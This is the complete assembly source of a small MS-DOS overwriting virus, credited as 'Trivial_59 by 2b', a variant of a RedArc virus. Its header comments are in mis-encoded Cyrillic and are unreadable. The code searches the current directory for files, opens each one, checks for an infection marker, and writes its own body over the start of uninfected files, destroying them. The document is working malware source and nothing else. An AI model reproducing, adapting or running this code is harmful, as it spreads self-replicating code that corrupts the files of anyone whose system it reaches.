; Trivial_59 by 2b  was (Trivial_63 (c) by RedArc)

;� ���� � ����஢���� ���-䠩��� � ⥪�饬 ��⠫���
;� ����஢���� � ��砫�
;� �� �ᯮ���� ��� �ணࠬ��-�����
;� �� ����� ��� �����, �� ������ �������� ��� ��祭��
;� �� ��ࠦ��� ����୮ 㦥 ����஢���� �ணࠬ��
;� �� १������

;� � ��ࠦ����� 䠩�� ��᫥���� 178 ���� - ���������  ;)
;PS: �� �� ᠬ�... ����� �� ����.

Model Tiny
.code
org 100h
start:
        db '*.*',0h
       xchg cx,ax
@a:    mov ah,4eh
        mov dx,si
@0:
       int 21h
       jnb @1
       ret
@1:
       mov ax,3d02h

       cwd              ; mov dx,9eh
       mov dl,9eh       ;

       int 21h
       xchg bx,ax
       mov ah,3fh
       push sp
       pop cx
       mov dx,014eh
       int 21h
       cmp byte ptr ds:[si+54h],dl      ; offset @a+1-100h+4eh = 54h
       je @2
       inc ah           ; +256

       push ax

       xor cx,cx        ; mov ax,4200h
       mul cx           ; xor cx,cx
       mov ah,42h       ; cwd

       int 21h
       mov dx,si
       pop cx
       mov ah,40h
       int 21h
@2:
       mov ah,4fh
       jmp short @0
virlength equ $-start
end start
